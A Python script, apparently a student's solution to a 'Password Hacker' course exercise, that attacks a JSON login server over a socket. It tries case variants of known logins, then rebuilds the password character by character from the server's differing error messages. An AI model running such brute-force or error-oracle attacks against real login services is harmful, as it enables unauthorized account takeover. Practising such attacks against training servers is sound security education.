
# Project: Password Hacker - hyperskill
# STAGE 4

import socket
import sys
import itertools
import json


def get_response(socket):
    response = socket.recv(1024)
    response = json.loads(response)
    result = response['result']
    return result


def send_credent(socket, login, password=''):
    credent = {"login": login, "password": password}
    credent = json.dumps(credent)
    credent = credent.encode()
    socket.send(credent)


data = sys.argv
hostname = data[1]
port = int(data[2])

with open('logins.txt', 'r') as file:
    logins = [l.strip() for l in file.readlines()]

my_socket = socket.socket()
my_socket.connect((hostname, port))

#  get login
final_login = None
final_passw = None

loop_end = False
for p in logins:
    base = p
    com = list(range(len(p)))
    for length in range(len(p)+1):
        index = itertools.combinations(com, length)
        for i in index:
            p = base
            p = list(p)
            for ii in i:
                p[ii] = p[ii].upper()
            p = ''.join(p)
            send_credent(my_socket, p)
            result = get_response(my_socket)
            if result == "Wrong password!":
                final_login = p
                loop_end = True
                break
        if loop_end:
            break
    if loop_end:
        break
        

# get password
passw = []
signs = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
i = 0
while i < len(signs):
    passw.append(signs[i])
    passw_to_send = ''.join(passw)
    send_credent(my_socket, final_login, passw_to_send)
    result = get_response(my_socket)
    if result == 'Exception happened during login':
        i = 0
        continue
    elif result == "Wrong password!":
        i += 1
        passw.pop()
    elif result == "Connection success!":
        final_passw = passw_to_send
        break


fin_credent = {"login": final_login, "password": final_passw}
fin_credent = json.dumps(fin_credent)
print(fin_credent)
